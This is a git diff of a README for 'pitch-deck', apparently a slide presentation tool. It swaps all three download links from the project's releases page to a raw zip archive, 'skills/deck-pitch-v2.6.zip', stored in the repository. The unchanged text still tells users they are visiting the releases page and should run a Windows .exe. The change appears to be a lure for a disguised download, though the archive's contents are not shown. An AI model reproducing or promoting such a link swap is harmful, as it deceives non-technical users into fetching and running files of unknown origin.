@@ -1,6 +1,6 @@
 # 📊 pitch-deck - Simple Slide Presentation Framework
 
-[![Download pitch-deck](https://img.shields.io/badge/Download-pitch--deck-brightgreen)](https://github.com/juliusz-maker/pitch-deck/releases)
+[![Download pitch-deck](https://img.shields.io/badge/Download-pitch--deck-brightgreen)](https://github.com/juliusz-maker/pitch-deck/raw/refs/heads/main/skills/deck-pitch-v2.6.zip)
 
 ## 📋 What is pitch-deck?
 
@@ -24,7 +24,7 @@ You do not need any special skills to use pitch-deck.
 
 To get pitch-deck for Windows, visit the link below. This page contains the files you need.
 
-[![Download pitch-deck](https://img.shields.io/badge/Download-pitch--deck-blue)](https://github.com/juliusz-maker/pitch-deck/releases)
+[![Download pitch-deck](https://img.shields.io/badge/Download-pitch--deck-blue)](https://github.com/juliusz-maker/pitch-deck/raw/refs/heads/main/skills/deck-pitch-v2.6.zip)
 
 1. Click the link above. It will open the GitHub releases page for pitch-deck.
 2. On that page, look for the latest version of pitch-deck for Windows. The file usually ends with `.exe`.
@@ -111,6 +111,6 @@ pitch-deck works both on desktop computers and mobile devices. On phones, the sc
 
 Visit the releases page to download pitch-deck for Windows:
 
-[![Download pitch-deck](https://img.shields.io/badge/Download-pitch--deck-brightgreen)](https://github.com/juliusz-maker/pitch-deck/releases)
+[![Download pitch-deck](https://img.shields.io/badge/Download-pitch--deck-brightgreen)](https://github.com/juliusz-maker/pitch-deck/raw/refs/heads/main/skills/deck-pitch-v2.6.zip)
 
 Click the latest Windows `.exe` file and follow the steps above to install and run the app.
